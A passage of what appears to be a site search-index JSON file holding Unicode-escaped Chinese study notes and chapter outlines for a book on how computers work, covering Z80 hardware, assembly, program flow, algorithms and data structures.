\u8bc6\u4e0a\u3002\u901a\u8fc7\u63a2\u7a76\u8ba1\u7b97\u673a\u7684\u672c\u8d28\uff0c\u63d0\u5347\u5de5\u7a0b\u5e08\u5bf9\u8ba1\u7b97\u673a\u7684\u5174\u8da3\uff0c\u5728\u9762\u5bf9\u590d\u6742\u7684\u6700\u65b0\u6280 \u672f\u65f6\uff0c\u80fd\u591f\u8fc5\u901f\u638c\u63e1\u5176\u8981\u70b9\u5e76\u7075\u6d3b\u8fd0\u7528\u3002\u672c\u4e66\u4ee5\u56fe\u914d\u6587\uff0c\u4ee5\u8ba1\u7b97\u673a\u7684\u4e09\u5927\u539f\u5219\u4e3a\u5f00\u7aef\uff0c \u76f8\u7ee7\u4ecb\u7ecd\u4e86\u8ba1\u7b97\u673a\u7684\u7ed3\u6784\u3001\u624b\u5de5\u6c47\u7f16\u3001\u7a0b\u5e8f\u6d41\u7a0b\u3001\u7b97\u6cd5\u3001\u6570\u636e\u7ed3\u6784\u3001\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u3001 \u6570\u636e\u5e93\u3001TCP/IP \u7f51\u7edc\u3001\u6570\u636e\u52a0\u5bc6\u3001XML\u3001\u8ba1\u7b97\u673a\u7cfb\u7edf\u5f00\u53d1\u4ee5\u53ca SE \u7684\u76f8\u5173\u77e5\u8bc6\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#1","title":"\u7b2c1\u7ae0 \u8ba1\u7b97\u673a\u7684\u4e09\u5927\u539f\u5219","text":"<p>\u25cf 1.1 \u8ba1\u7b97\u673a\u7684\u4e09\u4e2a\u6839\u672c\u6027\u57fa\u7840</p> <p>\u25cf 1.2 \u8f93\u5165\u3001\u8fd0\u7b97\u3001\u8f93\u51fa\u662f\u786c\u4ef6\u7684\u57fa\u7840</p> <p>\u25cf 1.3 \u8f6f\u4ef6\u662f\u6307\u4ee4\u548c\u6570\u636e\u7684\u96c6\u5408 </p> <p>\u25cf 1.4 \u5bf9\u8ba1\u7b97\u673a\u6765\u8bf4\u4ec0\u4e48\u90fd\u662f\u6570\u5b57</p> <p>\u25cf 1.5 \u53ea\u8981\u7406\u89e3\u4e86\u4e09\u5927\u539f\u5219\uff0c\u5373\u4f7f\u9047\u5230\u96be\u61c2\u7684\u6700\u65b0\u6280\u672f\uff0c\u4e5f\u80fd\u8f7b\u677e\u5e94\u5bf9</p> <p>\u25cf 1.6 \u4e3a\u4e86\u8d34\u8fd1\u4eba\u7c7b\uff0c\u8ba1\u7b97\u673a\u5728\u4e0d\u65ad\u5730\u8fdb\u5316</p> <p>\u25cf 1.7 \u7a0d\u5fae\u9884\u4e60\u4e00\u4e0b</p> <p>\u63d0\u95ee1\u3001\u6bcf\u4e00\u4e2a\u6c49\u5b57\u5360\u7528\u7684\u5b57\u7b26\u7f16\u7801\u4e2a\u6570\u76f8\u540c\u5417\uff1f\u5b57\u7b26\u7f16\u7801\u4e0d\u540c\uff0c\u6c49\u5b57\u5360\u7528\u7684\u5b57\u8282\u6570\u4e5f\u4e0d\u540c\u3002\u5728 GBK \u5b57\u7b26\u7f16\u7801\u4e0b\uff0c\u6bcf\u4e00\u4e2a\u6c49\u5b57\u5360\u75282\u4e2a\u5b57\u8282\u3002\u5728 UTF-8 \u7f16\u7801\u4e0b\uff0c\u4e00\u4e2a\u6c49\u5b57\u5360\u75283\u4e2a\u5b57\u8282\u3002</p> <p>\u63d0\u95ee2\u3001\u8ba1\u7b97\u673a\u4e2d\u6240\u6709\u7684\u4fe1\u606f\u90fd\u4f1a\u5f53\u505a\u6570\u5b57\u5904\u7406\u5417\uff1f\u662f\u7684\uff0c\u6240\u6709\u7684\u4fe1\u606f\u90fd\u4f1a\u5f53\u505a\u6570\u5b57\u5904\u7406\u3002\u5305\u62ec\u989c\u8272\u7f16\u7801\u3001\u6587\u5b57\u5b57\u7b26\u7f16\u7801\uff0c\u6700\u540e\u90fd\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u6570\u5b57\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u8ba1\u7b97\u673a\u7684\u4e09\u4e2a\u6839\u672c\u6027\u57fa\u7840\uff1a1\u3001\u8ba1\u7b97\u673a\u662f\u6267\u884c\u8f93\u5165\u3001\u8fd0\u7b97\u3001\u8f93\u51fa\u7684\u673a\u5668 2\u3001\u7a0b\u5e8f\u662f\u6307\u4ee4\u548c\u6570\u636e\u7684\u96c6\u5408 3\u3001\u8ba1\u7b97\u673a\u5904\u7406\u65b9\u5f0f\u6709\u65f6\u5019\u4e0e\u4eba\u7c7b\u601d\u7ef4\u4e60\u60ef\u4e0d\u540c\u2014\u2014\u8fd9\u70b9\u5f88\u91cd\u8981\u3002\u8ba1\u7b97\u673a\u53ef\u4ee5\u8f7b\u677e\u5904\u7406\u591a\u6b21\u91cd\u590d\u6027\u5de5\u4f5c\uff08\u4f8b\u5982\u5faa\u73af\u6570\u636e\uff09\u3002\u5f53\u7136\u73b0\u5728\u4eba\u5de5\u667a\u80fd\u5927\u53d1\u5c55\uff0c\u8ba1\u7b97\u673a\u5f00\u59cb\u5b66\u4e60\u5f31\u4eba\u5de5\u667a\u80fd\uff0c\u8fd9\u662f\u672a\u6765\u7684\u7a81\u7834\u70b9\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#2","title":"\u7b2c2\u7ae0 \u8bd5\u7740\u5236\u9020\u4e00\u53f0\u8ba1\u7b97\u673a\u5427\uff08\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\uff09","text":"<p>\u901a\u5e38\u7528 Hz \u6765\u8868\u793a\u9a71\u52a8 CPU \u8fd0\u8f6c\u7684\u65f6\u949f\u4fe1\u53f7\u7684\u9891\u7387\u30021 \u79d2\u53d1\u51fa 1 \u6b21\u65f6\u949f\u4fe1\u53f7\u5c31\u662f 1Hz\uff0c\u6240\u4ee5 100MHz\uff08\u5146\u8d6b \u5179\uff09\u7684\u8bdd\u5c31\u662f 100\u00d7100 \u4e07 = 1 \u4ebf\u6b21\uff0f\u79d2\u3002M\uff08\u5146\uff09\u4ee3\u8868 100 \u4e07</p> <p>CPU \u4e0a\u6570\u636e\u603b\u7ebf\u7684\u6761\u6570\uff0c\u6216\u8005 CPU \u5185\u90e8\u53c2\u4e0e\u8fd0\u7b97\u7684\u5bc4 \u5b58\u5668\u7684\u5bb9\u91cf\uff0c\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u8861\u91cf CPU \u6027\u80fd\u7684\u6bd4\u7279\u6570\u3002\u5728 Z80 CPU \u4e2d\uff0c\u65e0\u8bba\u662f\u6570\u636e\u603b\u7ebf\u7684\u6761\u6570\u8fd8\u662f\u5bc4\u5b58\u5668\u7684\u5bb9 \u91cf\u90fd\u662f 8 \u6bd4\u7279\uff0c\u6240\u4ee5 Z80 CPU \u662f\u4e00\u6b3e 8 \u6bd4\u7279\u7684 CPU\u3002 \u800c\u5728 Windows \u4e2a\u4eba\u8ba1\u7b97\u673a\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u7684 Pentium\uff08\u5954 \u817e\uff09CPU \u5219\u662f 32 \u6bd4\u7279\u7684 CPU\u3002</p> <p>\u25cf 2.1 \u5236\u4f5c\u5fae\u578b\u8ba1\u7b97\u673a\u6240\u5fc5\u9700\u7684\u5143\u4ef6 17</p> <p>\u5236\u4f5c\u5fae\u578b\u8ba1\u7b97\u673a\u6240\u9700\u7684\u57fa\u7840\u5143\u4ef6\u53ea\u6709 3 \u4e2a\uff0cCPU\u3001\u5185\u5b58\u548c I/O</p> <p>CPU \u662f\u8ba1\u7b97\u673a\u7684\u5927\u8111\uff0c\u8d1f\u8d23\u89e3\u91ca\u3001\u6267\u884c\u7a0b\u5e8f\u3002\u5185\u5b58\u8d1f\u8d23\u5b58\u50a8\u7a0b \u5e8f\u548c\u6570\u636e\u3002I/O \u662f Input/Output\uff08\u8f93\u5165\uff0f\u8f93\u51fa\uff09\u7684\u7f29\u5199\uff0c\u8d1f\u8d23\u5c06\u8ba1\u7b97\u673a\u548c \u5916\u90e8\u8bbe\u5907\uff08\u5468\u8fb9\u8bbe\u5907\uff09\u8fde\u63a5\u5728\u4e00\u8d77</p> <p>\u8f93\u51fa\u65f6\u949f\u4fe1\u53f7\u7684\u5143\u4ef6\u53eb\u4f5c\u201c\u65f6\u949f\u53d1\u751f\u5668\u201d\u3002 \u65f6\u949f\u53d1\u751f\u5668\u4e2d\u5e26\u6709\u6676\u632f\uff0c\u6839\u636e\u5176\u81ea\u8eab\u7684\u9891\u7387\uff08\u632f\u52a8\u7684\u6b21\u6570\uff09\u4ea7\u751f\u65f6\u949f\u4fe1 \u53f7\u3002 \u65f6 \u949f \u4fe1 \u53f7 \u7684 \u9891 \u7387 \u53ef \u4ee5 \u8861 \u91cf CPU \u7684 \u8fd0 \u8f6c \u901f \u5ea6\u3002 \u8fd9 \u91cc \u4f7f \u7528 \u7684 \u662f 2.5MHz\uff08\u5146\u8d6b\u5179\uff09\u7684\u65f6\u949f\u53d1\u751f\u5668\u3002</p> <p>\u25cf 2.2 \u7535\u8def\u56fe\u7684\u8bfb\u6cd5 21 </p> <p>\u25cf 2.3 \u8fde\u63a5\u7535\u6e90\u3001\u6570\u636e\u548c\u5730\u5740\u603b\u7ebf 23 </p> <p>\u5fae\u578b\u8ba1\u7b97\u673a\u6240\u4f7f\u7528\u7684 IC \u5c5e\u4e8e\u6570\u5b57 IC\u3002\u5728\u6570\u5b57 IC \u4e2d\uff0c\u6bcf\u4e2a\u5f15\u811a\u4e0a \u7684\u7535\u538b\u8981\u4e48\u662f 0V\u3001\u8981\u4e48\u662f +5V\uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u7535\u538b\u4e0e\u5176\u4ed6\u7684 IC \u8fdb\u884c\u7535 \u4fe1\u53f7\u7684\u6536\u53d1\u3002\u7528\u4e8e\u7ed9 IC \u4f9b\u7535\u7684 Vcc \u5f15\u811a\u548c GND \u5f15\u811a\u4e0a\u7684\u7535\u538b\u662f\u6052\u5b9a \u4e0d\u53d8\u7684 +5V \u548c 0V\uff0c\u4f46\u662f\u5176\u4ed6\u5f15\u811a\u4e0a\u7684\u7535\u538b\uff0c\u4f1a\u968f\u7740\u8ba1\u7b97\u673a\u7684\u64cd\u4f5c\u5728 +5V \u548c 0V \u4e4b\u95f4\u4e0d\u65ad\u5730\u53d8\u5316</p> <p>\u25cf 2.4 \u8fde\u63a5I/O 26 </p> <p>Z80 PIO \u4e0a\u5171\u6709 4 \u4e2a\u5bc4\u5b58\u5668\u30022 \u4e2a\u7528\u4e8e \u8bbe\u5b9a PIO \u672c\u8eab\u7684\u529f\u80fd\uff0c2 \u4e2a\u7528\u4e8e\u5b58\u50a8\u4e0e\u5916\u90e8\u8bbe\u5907\u8fdb\u884c\u8f93\u5165\u8f93\u51fa\u7684\u6570\u636e</p> <p>\u25cf 2.5 \u8fde\u63a5\u65f6\u949f\u4fe1\u53f7 27 </p> <p>\u628a\u65f6\u949f\u53d1\u751f\u5668\u7684 8 \u53f7\u5f15\u811a\u548c Z80 CPU \u7684 CLK \uff08CLK \u5373 Clock\uff0c\u65f6\u949f\uff09\u5f15\u811a\u3001Z80 PIO \u7684 CLK \u5f15\u811a\u5206\u522b\u8fde\u63a5\u8d77\u6765\u3002\u65f6 \u949f\u53d1\u751f\u5668\u7684 8 \u53f7\u5f15\u811a\u4e0e +5V \u4e4b\u95f4\u7684\u7535\u963b\u7528\u4e8e\u6e05\u7406\u65f6\u949f\u4fe1\u53f7</p> <p>\u25cf 2.6 \u8fde\u63a5\u7528\u4e8e\u533a\u5206\u8bfb\u5199\u5bf9\u8c61\u662f\u5185\u5b58\u8fd8\u662fI/O\u7684\u5f15\u811a 28 </p> <p>\u25cf 2.7 \u8fde\u63a5\u5269\u4f59\u7684\u63a7\u5236\u5f15\u811a 29 </p> <p>\u25cf 2.8 \u8fde\u63a5\u5916\u90e8\u8bbe\u5907\uff0c\u901a\u8fc7DMA\u8f93\u5165\u7a0b\u5e8f 34</p> <p>\u25cf 2.9 \u8fde\u63a5\u7528\u4e8e\u8f93\u5165\u8f93\u51fa\u7684\u5916\u90e8\u8bbe\u5907 35 </p> <p>\u25cf 2.10 \u8f93\u5165\u6d4b\u8bd5\u7a0b\u5e8f\u5e76\u8fdb\u884c\u8c03\u8bd5 36</p> <p>\u5176\u5b9e\u8fd9\u4e9b\u8bed\u8a00\u90fd\u65e0\u6cd5\u4f7f\u7528\uff0c\u56e0\u4e3a\u4f5c \u4e3a\u8ba1\u7b97\u673a\u5927\u8111\u7684 CPU \u53ea\u80fd\u89e3\u91ca\u6267\u884c\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00\uff0c\u90a3\u5c31\u662f\u9760\u7f57\u5217\u4e8c\u8fdb \u5236\u6570\u6784\u6210\u7684\u673a\u5668\u8bed\u8a00\uff08\u539f\u751f\u4ee3\u7801\uff09\u3002</p> <p>\u603b\u7ebf\u5206\u4e3a\u6570\u636e\u603b\u7ebf\uff0c\u5730\u5740\u603b\u7ebf\uff0c\u63a7\u5236\u603b\u7ebf\u3002\u5b9e\u9645\u4e0a\u603b\u7ebf\u5e76\u4e0d\u662f\u4e00\u6839\u7ebf\uff0c\u800c\u662f\u4e0d\u540c\u5355\u5143\u4e0a\u6709\u5f88\u591a\u4e32\u53e3\uff0c\u4e0d\u540c\u4e32\u53e3\u4e4b\u95f4\u8fde\u63a5\uff0c\u5206\u522b\u6267\u884c\u6570\u636e\u5730\u5740\u63a7\u5236\u7b49\u529f\u80fd\u3002\u8fd9\u4e9b\u8fde\u63a5\u7684\u5408\u96c6\u5c31\u662f\u603b\u7ebf\uff08\u5b9e\u9645\u4e0a\u6709\u51e0\u767e\u4e2a\u94fe\u63a5\uff09\u3002\u4e0d\u540c\u8282\u5c31\u662f\u4ecb\u7ecd\u4e0d\u540c\u7684\u6a21\u5757\u5177\u4f53\u600e\u6837\u8fde\u63a5\uff0c\u4ee5\u53ca\u6700\u7ec8\u8fde\u63a5\u540e\u7684\u8c03\u8bd5\u5de5\u4f5c\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#3-54-72","title":"\u7b2c3\u7ae0 \u4f53\u9a8c\u4e00\u6b21\u624b\u5de5\u6c47\u7f16\uff08\u6c47\u7f16\u8bed\u8a00\uff09-\u6b63\u5728\u770b 54-72","text":"<p>\u25cf 3.1 \u4ece\u7a0b\u5e8f\u5458\u7684\u89d2\u5ea6\u770b\u786c\u4ef6 41</p> <p>\u25cf 3.2 \u673a\u5668\u8bed\u8a00\u548c\u6c47\u7f16\u8bed\u8a00 44</p> <p>\u6839\u636e\u8868\u793a\u6307\u4ee4\u529f\u80fd\u7684\u82f1\u8bed\u5355 \u8bcd\u8d77\u4e00\u4e2a\u76f8\u4f3c\u7684\u6635\u79f0\uff0c\u5e76\u5c06\u8fd9\u4e2a\u6635\u79f0\u8d4b\u4e88\u7ed9 0 \u548c 1 \u7684\u7ec4\u5408\u3002\u8fd9\u79cd\u7c7b\u4f3c \u82f1\u8bed\u5355\u8bcd\u7684\u6635\u79f0\u53eb\u4f5c\u201c\u52a9\u8bb0\u7b26\u201d\uff0c\u4f7f\u7528\u52a9\u8bb0\u7b26\u7684\u7f16\u7a0b\u8bed\u8a00\u53eb\u4f5c\u201c\u6c47\u7f16\u8bed \u8a00\u201d\u3002</p> <p>\u6309\u529f\u80fd\u8fd9\u4e9b\u6307\u4ee4\u53ef\u4ee5\u5206\u6210\u8fd0\u7b97\u3001\u4e0e\u5185\u5b58\u7684\u8f93\u5165\u8f93\u51fa\u548c \u4e0e I/O \u7684\u8f93\u5165\u8f93\u51fa\u4e09\u7c7b\u3002</p> <p>\u25cf 3.3 Z80 CPU\u7684\u5bc4\u5b58\u5668\u7ed3\u6784 49 </p> <p>\u5728 CPU \u5185\u90e8\u5c31\u5e94\u8be5\u6709\u5b58\u50a8\u6570\u636e\u7684\u5730\u65b9\u3002\u8fd9\u79cd \u5b58\u50a8\u6570\u636e\u7684\u5730\u65b9\u53eb\u4f5c\u201c\u5bc4\u5b58\u5668\u201d\u3002\u867d\u7136\u4e5f\u53eb\u5bc4\u5b58\u5668\uff0c\u4f46\u662f\u4e0e I/O \u7684\u5bc4\u5b58 \u5668\u4e0d\u540c\uff0cCPU \u7684\u5bc4\u5b58\u5668\u4e0d\u4ec5\u80fd\u5b58\u50a8\u6570\u636e\uff0c\u8fd8\u5177\u5907\u5bf9\u6570\u636e\u8fdb\u884c\u8fd0\u7b97\u7684\u80fd \u529b\u3002</p> <p>\u25cf 3.4 \u8ffd\u8e2a\u7a0b\u5e8f\u7684\u8fd0\u884c\u8fc7\u7a0b 52 </p> <p>\u25cf 3.5 \u5c1d\u8bd5\u624b\u5de5\u6c47\u7f16 54 </p> <p>\u25cf 3.6 \u5c1d\u8bd5\u4f30\u7b97\u7a0b\u5e8f\u7684\u6267\u884c\u65f6\u95f4 57</p> <p>\u4e09\u4e2a\u95ee\u9898\uff1a</p> <p>1\u3001\u4ec0\u4e48\u662f\u673a\u5668\u8bed\u8a00\uff1f\u4e8c\u8fdb\u5236\u6570\u5b57\u6784\u6210\u7684\u7a0b\u5e8f\uff0cCPU \u53ef\u4ee5\u76f4\u63a5\u89e3\u91ca\u5e76\u6267\u884c\u3002\u4e0d\u7ba1\u662f\u4f4e\u7ea7\u7684\u6c47\u7f16\u8bed\u8a00\uff0c\u8fd8\u662f\u9ad8\u7ea7\u7684C\u8bed\u8a00\uff0c\u90fd\u9700\u8981\u8f6c\u6362\u6210\u673a\u5668\u8bed\u8a00\u6700\u540e\u624d\u80fd\u88ab\u6267\u884c\u3002</p> <p>2\u3001\u6807\u8bc6\u5185\u5b58\u5b58\u50a8\u5355\u5143\u6216\u8005 IO \u4e2d\u7684\u5bc4\u5b58\u5668\u7684\u6570\u5b57\u662f\u4ec0\u4e48\uff1f\u53eb\u505a\u5185\u5b58\u5730\u5740\u3002\u4ece 0 \u5f00\u59cb\u6807\u8bc6\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u3002\u5177\u4f53\u5bc4\u5b58\u5668\u548c\u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u53d6\u51b3\u4e8e CPU \u548c IO \u4e4b\u95f4\u7684\u5e03\u7ebf\u3002</p> <p>3\u3001CPU \u4e2d\u6807\u5fd7\u5bc4\u5b58\u5668\uff08Flags Register\uff09\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f\u7528\u4e8e\u6307\u4ee4\u8fd0\u7b97\u7ed3\u675f\u540e\uff0c\u5b58\u50a8\u8fd0\u7b97\u7ed3\u679c\u7684\u67d0\u4e9b\u72b6\u6001\u3002\u5982\u679c\u6267\u884c\u4e86\u67d0\u4e2a\u7b97\u672f\u8fd0\u7b97\uff0c\u903b\u8f91\u8fd0\u7b97\uff0c\u6bd4\u8f83\u8fd0\u7b97\uff0c\u6807\u5fd7\u5bc4\u5b58\u5668\u5e76\u4e0d\u4f1a\u5b58\u653e\u5f53\u524d\u7684\u7ed3\u679c\uff0c\u800c\u662f\u5b58\u653e\u8fd0\u7b97\u540e\u7684\u67d0\u4e9b\u72b6\u6001\uff08\u4f8b\u5982\u662f\u5426\u9519\u8bef\uff0c\u662f\u5426\u5185\u5b58\u6ea2\u51fa\uff0c\u662f\u5426\u8d1f\u6570\u7b49\uff09\u8fd9\u91cc\u5b58\u653e\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</p> <p>\u8fd9\u4e00\u7ae0\u9700\u8981\u4eb2\u81ea\u4f53\u9a8c\u8ba1\u7b97\u673a\u8fd0\u884c\u673a\u5236\uff0c\u5c31\u662f\u5199\u6c47\u7f16\u8bed\u8a00\uff0c\u7136\u540e\u624b\u52a8\u8f6c\u6362\u6210\u673a\u5668\u8bed\u8a00\u8fdb\u884c\u6267\u884c\u3002</p> <p>\u7f16\u5199\u6c47\u7f16\u8bed\u8a00\u524d\uff0c\u9700\u8981\u6e05\u695a\u8ba1\u7b97\u673a\u786c\u4ef6\u7684\u4fe1\u606f\uff0c\u4f8b\u5982CPU\uff08CPU\u7684\u79cd\u7c7b\u51b3\u5b9a\u54ea\u79cd\u673a\u5668\u8bed\u8a00\uff0c\u65f6\u949f\u4fe1\u53f7\u7684\u9891\u7387\uff09\u3001\u5185\u5b58\uff08\u5185\u5b58\u5730\u5740\u7a7a\u95f4\uff0c\u6bcf\u4e2a\u5730\u5740\u5b58\u653e\u4fe1\u606f\u7684\u6bd4\u7279\u4f4d\u6570\uff09\u3001IO\uff08IO\u7684\u79cd\u7c7b\uff0c\u5730\u5740\u7a7a\u95f4\uff0c\u5468\u8fb9\u8bbe\u5907\uff09\u3002</p> <p>\u3010CPU\uff08\u5904\u7406\u5668\uff09\u4fe1\u606f\u3011 \u25cf CPU \u7684\u79cd\u7c7b \u25cf \u65f6\u949f\u4fe1\u53f7\u7684\u9891\u7387 \u3010\u5185\u5b58\u4fe1\u606f\u3011 \u25cf \u5730\u5740\u7a7a\u95f4 \u25cf \u6bcf\u4e2a\u5730\u5740\u4e2d\u53ef\u4ee5\u5b58\u50a8\u591a\u5c11\u6bd4\u7279\u7684\u4fe1\u606f \u3010I/O \u4fe1\u606f\u3011 \u25cf I/O \u7684\u79cd\u7c7b \u25cf \u5730\u5740\u7a7a\u95f4 \u25cf \u8fde\u63a5\u7740\u4f55\u79cd\u5468\u8fb9\u8bbe\u5907</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#4-72-96","title":"\u7b2c4\u7ae0 \u7a0b\u5e8f\u50cf\u6cb3\u6c34\u4e00\u6837\u6d41\u52a8\u7740\uff08\u7a0b\u5e8f\u4e0e\u8bbe\u8ba1\uff0972-96","text":"<p>\u25cf 4.1 \u7a0b\u5e8f\u7684\u6d41\u7a0b\u5206\u4e3a\u4e09\u79cd 61 </p> <p>CPU \u4e2d\u6709\u5404\u79cd\u5404\u6837\u7684\u5404\u53f8\u5176\u804c\u7684\u5bc4\u5b58\u5668\u3002\u5176\u4e2d\u6709\u4e00\u4e2a\u88ab\u79f0\u4e3a PC \uff08Program Counter\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668\uff09\u7684\u5bc4\u5b58\u5668\uff0c\u8d1f\u8d23\u5b58\u50a8\u5185\u5b58\u5730\u5740\uff0c\u8be5\u5730 \u5740\u6307\u5411\u4e0b\u4e00\u6761\u5373\u5c06\u6267\u884c\u7684\u6307\u4ee4\u3002\u6bcf\u89e3\u91ca\u6267\u884c\u5b8c\u4e00\u6761\u6307\u4ee4\uff0cPC \u5bc4\u5b58\u5668\u7684 \u503c\u5c31\u4f1a\u81ea\u52a8\u88ab\u66f4\u65b0\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002</p> <p>\u25cf 4.2 \u7528\u6d41\u7a0b\u56fe\u8868\u793a\u7a0b\u5e8f\u7684\u6d41\u7a0b 65</p> <p>\u25cf 4.3 \u8868\u793a\u5faa\u73af\u7a0b\u5e8f\u5757\u7684\u201c\u5e3d\u5b50\u201d\u548c\u201c\u77ed\u88e4\u201d 68 </p> <p>\u25cf 4.4 \u7ed3\u6784\u5316\u7a0b\u5e8f\u8bbe\u8ba1 72 </p> <p>\u4e3a\u4e86\u628a\u7a0b\u5e8f\u7f16\u5199\u5f97\u5177\u5907\u7ed3\u6784\u6027\uff0c\u4ec5\u4f7f\u7528\u987a\u5e8f\u6267\u884c\u3001\u6761\u4ef6\u5206 \u652f\u548c\u5faa\u73af\u8868\u793a\u7a0b\u5e8f\u7684\u6d41\u7a0b\u5373\u53ef\uff0c\u800c\u4e0d\u518d\u4f7f\u7528\u8df3\u8f6c\u6307\u4ee4</p> <p>\u25cf 4.5 \u753b\u6d41\u7a0b\u56fe\u6765\u601d\u8003\u7b97\u6cd5 75 </p> <p>\u25cf 4.6 \u7279\u6b8a\u7684\u7a0b\u5e8f\u6d41\u7a0b\u2014\u2014\u4e2d\u65ad\u5904\u7406 77 </p> <p>\u25cf 4.7 \u7279\u6b8a\u7684\u7a0b\u5e8f\u6d41\u7a0b\u2014\u2014\u4e8b\u4ef6\u9a71\u52a8 78</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#5","title":"\u7b2c5\u7ae0 \u4e0e\u7b97\u6cd5\u6210\u4e3a\u597d\u670b\u53cb\u7684\u4e03\u4e2a\u8981\u70b9\uff08\u7b97\u6cd5\u8bbe\u8ba1\uff09","text":"<p>\u25cf 5.1 \u7b97\u6cd5\u662f\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u201c\u719f\u8bed\u201d 87 </p> <p>\u25cf 5.2 \u8981\u70b9 1 :\u7b97\u6cd5\u4e2d\u89e3\u51b3\u95ee\u9898\u7684\u6b65\u9aa4\u662f\u660e\u786e\u4e14\u6709\u9650\u7684 88 </p> <p>\u25cf 5.3 \u8981\u70b9 2 :\u8ba1\u7b97\u673a\u4e0d\u9760\u76f4\u89c9\u800c\u662f\u673a\u68b0\u5730\u89e3\u51b3\u95ee\u9898 89 </p> <p>\u25cf 5.4 \u8981\u70b9 3 :\u4e86\u89e3\u5e76\u5e94\u7528\u5178\u578b\u7b97\u6cd5 91 </p> <p>\u25cf 5.5 \u8981\u70b9 4 :\u5229\u7528\u8ba1\u7b97\u673a\u7684\u5904\u7406\u901f\u5ea6 92 </p> <p>\u25cf 5.6 \u8981\u70b9 5 :\u4f7f\u7528\u7f16\u7a0b\u6280\u5de7\u63d0\u5347\u7a0b\u5e8f\u6267\u884c\u901f\u5ea6 95 </p> <p>\u25cf 5.7 \u8981\u70b9 6 :\u627e\u51fa\u6570\u5b57\u95f4\u7684\u89c4\u5f8b 99 </p> <p>\u25cf 5.8 \u8981\u70b9 7 :\u5148\u5728\u7eb8\u4e0a\u8003\u8651\u7b97\u6cd5 101</p> <p>\u6700\u540e\u4ecb\u7ecd\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u70b9\uff0c\u90a3\u5c31\u662f\u601d\u8003\u7b97\u6cd5\u7684\u65f6\u5019\uff0c\u8981\u5148\u5728\u7eb8\u4e0a\u7528\u6587\u5b57\u6216\u56fe\u8868\u63cf\u8ff0\u51fa\u89e3\u51b3\u95ee\u9898\u7684\u6b65\u9aa4\uff0c\u800c\u4e0d\u8981\u7acb\u523b\u5f00\u59cb\u7f16\u5199\u4ee3\u7801\u3002\u524d\u8fb9\u7684\u7b97\u6cd5\u4ecb\u7ecd\u5c31\u662f\u8f97\u8f6c\u53cd\u4fa7\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\uff0c\u5176\u4ed6\u7ec6\u8282\u5f88\u7b80\u5355\uff0c\u4e0d\u63cf\u8ff0\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#6","title":"\u7b2c6\u7ae0 \u4e0e\u6570\u636e\u7ed3\u6784\u6210\u4e3a\u597d\u670b\u53cb\u7684\u4e03\u4e2a\u8981\u70b9\uff08\u6570\u636e\u7ed3\u6784\uff09","text":"<p>\u25cf 6.1 \u8981\u70b9 1 :\u4e86\u89e3\u5185\u5b58\u548c\u53d8\u91cf\u7684\u5173\u7cfb 105 </p> <p>\u25cf 6.2 \u8981\u70b9 2 :\u4e86\u89e3\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784\u57fa\u7840\u7684\u6570\u7ec4 108 </p> <p>\u25cf 6.3 \u8981\u70b9 3 :\u4e86\u89e3\u6570\u7ec4\u7684\u5e94\u7528\u2014\u2014\u4f5c\u4e3a\u5178\u578b\u7b97\u6cd5\u7684\u6570\u636e\u7ed3\u6784 109 </p> <p>\u25cf 6.4 \u8981\u70b9 4 :\u4e86\u89e3\u5e76\u638c\u63e1\u5178\u578b\u6570\u636e\u7ed3\u6784\u7684\u7c7b\u578b\u548c\u6982\u5ff5 111 </p> <p>\u25cf 6.5 \u8981\u70b9 5 :\u4e86\u89e3\u6808\u548c\u961f\u5217\u7684\u5b9e\u73b0\u65b9\u6cd5 114 </p> <p>\u25cf 6.6 \u8981\u70b9 6 :\u4e86\u89e3\u7ed3\u6784\u4f53\u7684\u7ec4\u6210 118</p> <p>\u25cf 6.7 \u8981\u70b9 7 :\u4e86\u89e3\u94fe\u8868\u548c\u4e8c\u53c9\u6811\u7684\u5b9e\u73b0\u65b9\u6cd5 120</p> 